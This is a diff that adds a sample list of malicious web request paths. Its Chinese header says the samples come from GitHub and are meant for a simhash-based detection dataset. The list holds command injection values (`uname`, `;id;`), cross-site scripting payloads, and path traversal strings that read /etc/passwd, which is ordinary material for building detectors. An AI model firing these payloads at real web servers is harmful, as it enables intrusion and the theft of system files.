@@ -1,0 +1,13 @@
+##################攻击样本github去找吧,simhash支持数百万的样本数据##########################################
+/top.php?stuff='uname >q36497765 #
+/h21y8w52.nsf?<script>cross_site_scripting.nasl</script>
+/ca000001.pl?action=showcart&hop=\"><script>alert('vulnerable')</script>&path=acatalog/
+/scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; 
+/javascript/mta.exe
+/examples/jsp/colors/kernel/loadkernel.php?installpath=/etc/passwd\x00
+/examples/jsp/cal/feedsplitter.php?format=../../../../../../../../../../etc/passwd\x00&debug=1
+/bb-hist.sh?histfile=../../../../../etc/passwd
+/cgi-bin/view_user.php?list=1&letter=&sort_by=aaaaaa
+/<script>document.cookie="testggad=2000;"</script>
+/ybz5rz7a.pl?<script>document.cookie="testsbvw=6289;"</script>
+/javascript/backup.exe
